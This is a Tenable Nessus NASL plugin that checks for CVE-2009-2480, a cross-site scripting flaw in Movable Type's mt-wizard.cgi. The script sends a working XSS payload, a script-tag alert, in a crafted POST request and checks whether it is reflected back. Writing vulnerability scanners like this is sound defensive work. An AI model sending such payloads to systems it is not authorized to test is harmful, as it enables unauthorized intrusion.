#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(39538);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2009-2480");
  script_bugtraq_id(35471);
  script_xref(name:"Secunia", value:"35534");
  script_xref(name:"OSVDB", value:"55379");

  script_name(english:"Movable Type mt-wizard.cgi set_static_uri_to Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "A Perl application running on the remote web server has a\n",
      "cross-site scripting vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of Movable Type running on the remote host has a cross-\n",
      "site scripting vulnerability in 'mt-wizard.cgi'.  Input to the\n",
      "'set_static_uri_to' parameter is not sanitized.  A remote attacker\n",
      "could exploit this by tricking a user into submitting a specially\n",
      "crafted POST request, which would execute arbitrary script code in\n",
      "the context of the web server.\n\n",
      "There is also reportedly a security bypass vulnerability in this\n",
      "version of Movable Type, though Nessus has not checked for this issue."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?bf584de7"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?db99b961"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?979a3eaf"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to Movable Type version 4.26 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("cross_site_scripting.nasl", "movabletype_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

install = get_kb_item(string("www/", port, "/movabletype"));
if (isnull(install))
  exit(1, 'Movable Type does not appear to be installed on port ' + port + '.');

match = eregmatch(string:install, pattern:".+ under (/.*)$");
# sanity check - if there's something in the KB, we should always get a match
if (isnull(match)) exit(1, 'Error retrieving Movable Type dir from the KB');
dir = match[1];

unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-]/?=&";
xss = string("<script>alert('", SCRIPT_NAME, "')</script>");
encoded_xss = urlencode(str:xss, unreserved:unreserved);
expected_output = string("<strong>Error: '", xss, "' could not be found.");

postdata = string(
  '__mode=next_step&',
  'step=pre_start&',
  'config=&',
  'set_static_uri_to=', encoded_xss
);

url = string(dir, '/mt-wizard.cgi');
req = http_mk_post_req(
  port        : port,
  item        : url,
  data        : postdata
);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(1, 'No response was received from the web server.');
 
if (expected_output >< res[2])
{
  set_kb_item(name: 'www/' + port + '/XSS', value: TRUE);
 
  if (report_verbosity > 0)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report = string(
      "\n",
      "Nessus was able to exploit the issue using the following request :\n\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
      req_str, "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}

# If we made it this far without exiting, none of the XSS attempts worked
exit(1, "This version of Movable Type doesn't appear to be vulnerable.");
